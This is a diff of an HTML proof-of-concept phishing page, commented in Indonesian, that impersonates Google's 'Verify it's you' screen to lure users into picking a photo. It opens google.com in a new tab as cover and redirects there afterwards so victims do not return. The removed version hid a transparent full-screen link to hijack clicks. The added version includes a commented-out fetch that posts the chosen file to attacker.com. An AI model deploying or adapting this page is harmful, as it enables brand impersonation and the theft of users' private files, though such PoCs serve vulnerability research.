@@ -3,12 +3,6 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta
-      http-equiv="Cache-Control"
-      content="no-cache, no-store, must-revalidate"
-    />
-    <meta http-equiv="Pragma" content="no-cache" />
-    <meta http-equiv="Expires" content="0" />
     <title>Google Account Security</title>
     <style>
       * {
@@ -17,163 +11,74 @@
         padding: 0;
       }
       body {
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        font-family: Arial, sans-serif;
         display: flex;
-        flex-direction: column;
-        align-items: center;
         justify-content: center;
+        align-items: center;
         height: 100vh;
-        background-color: #f8f9fa;
-        color: #202124;
+        background: #f8f9fa;
         text-align: center;
       }
       .container {
         padding: 30px;
-        max-width: 450px;
-        width: 90%;
+        max-width: 400px;
         background: white;
-        border: 1px solid #dadce0;
         border-radius: 8px;
       }
-      .logo {
-        font-size: 28px;
-        font-weight: 600;
-        margin-bottom: 25px;
-      }
-      .g-blue {
-        color: #4285f4;
-      }
-      .g-red {
-        color: #ea4335;
-      }
-      .g-yellow {
-        color: #fbbc05;
-      }
-      .g-green {
-        color: #34a853;
-      }
-      h1 {
-        font-size: 24px;
-        font-weight: 500;
-        margin-bottom: 15px;
-      }
-      p {
-        font-size: 16px;
-        line-height: 1.6;
-        margin-bottom: 30px;
-        color: #5f6368;
-      }
       .btn-ui {
-        background-color: #1a73e8;
+        background: #1a73e8;
         color: white;
-        padding: 12px 24px;
+        padding: 10px 20px;
         border-radius: 4px;
-        font-size: 14px;
-        font-weight: 500;
+        cursor: pointer;
         display: inline-block;
-        cursor: pointer;
       }
-      #link {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 9999;
-        cursor: pointer;
-        opacity: 0;
-      }
-      input {
-        display: none;
-      }
-      #img {
-        margin-top: 25px;
-        max-width: 100%;
-        max-height: 200px;
-        border-radius: 4px;
-        display: none;
-      }
-      .success-msg {
-        margin-top: 15px;
-        color: green;
-        font-size: 14px;
+      #fileSelect {
         display: none;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <div class="logo">
-        <span class="g-blue">G</span><span class="g-red">o</span
-        ><span class="g-yellow">o</span><span class="g-blue">g</span
-        ><span class="g-green">l</span><span class="g-red">e</span>
-      </div>
       <h1>Verify it's you</h1>
-      <p>
-        To keep your account secure, Google needs to verify your identity. Tap
-        anywhere to upload a verification photo.
-      </p>
-      <div class="btn-ui">Continue to Google</div>
-      <img id="img" alt="Captured Content" />
-      <div id="successMsg" class="success-msg">
-        ✓ File captured successfully!
-      </div>
+      <p>Tap to upload a verification photo.</p>
+      <div class="btn-ui" id="triggerBtn">Continue to Google</div>
     </div>
-    <input id="fileSelect" type="file" accept="image/*" />
-    <a id="link"></a>
+    <input type="file" id="fileSelect" accept="image/*" />
 
     <script>
-      (function () {
-        const fileSelect = document.getElementById("fileSelect");
-        const link = document.getElementById("link");
-        const img = document.getElementById("img");
-        const successMsg = document.getElementById("successMsg");
+      const trigger = document.getElementById("triggerBtn");
+      const fileInput = document.getElementById("fileSelect");
 
-        // Tampilkan gambar dari localStorage jika ada
-        function loadSavedImage() {
-          const savedImage = localStorage.getItem("capturedImage");
-          if (savedImage) {
-            img.src = savedImage;
-            img.style.display = "block";
-            successMsg.style.display = "block";
-            console.log("Loaded saved image from localStorage");
-          }
-        }
+      trigger.onclick = (e) => {
+        e.preventDefault();
+        alert("System Action Required: Select a photo for verification.");
+        // Buka file picker
+        fileInput.click();
+        // Buka tab baru ke Google.com (trusted domain)
+        window.open("https://google.com", "_blank");
+      };
 
-        // Saat halaman dimuat pertama kali
-        window.addEventListener("DOMContentLoaded", loadSavedImage);
-        // Khusus untuk back/forward cache (bfcache) di WebView
-        window.addEventListener("pageshow", function (event) {
-          if (event.persisted) {
-            loadSavedImage();
-          }
-        });
-
-        link.onclick = (e) => {
-          e.preventDefault();
+      fileInput.onchange = () => {
+        if (fileInput.files.length > 0) {
+          const file = fileInput.files[0];
+          // --- BUKTI EKSPLOITASI ---
+          // Opsi 1: Tampilkan alert nama file (cukup untuk PoC)
           alert(
-            "System Action Required: Please select a photo to proceed with Google verification.",
+            "[PoC] File selected: " +
+              file.name +
+              ". This file would be sent to attacker server.",
           );
-          fileSelect.click();
-          window.open("https://google.com", "_blank");
-        };
+          // Opsi 2: Kirim file ke server attacker (simulasi dengan fetch)
+          // const formData = new FormData();
+          // formData.append('file', file);
+          // fetch('https://attacker.com/upload', { method: 'POST', body: formData });
 
-        fileSelect.onchange = (event) => {
-          if (fileSelect.files.length > 0) {
-            const file = fileSelect.files[0];
-            const reader = new FileReader();
-            reader.onload = function (ev) {
-              const dataUrl = ev.target.result;
-              localStorage.setItem("capturedImage", dataUrl);
-              img.src = dataUrl;
-              img.style.display = "block";
-              successMsg.style.display = "block";
-              console.log("File captured and saved:", file.name);
-            };
-            reader.readAsDataURL(file);
-          }
-        };
-      })();
+          // Setelah file dipilih, redirect halaman attacker ke halaman sukses (misal ke google.com lagi)
+          // agar korban tidak perlu kembali ke halaman attacker.
+          window.location.href = "https://www.google.com";
+        }
+      };
     </script>
   </body>
 </html>
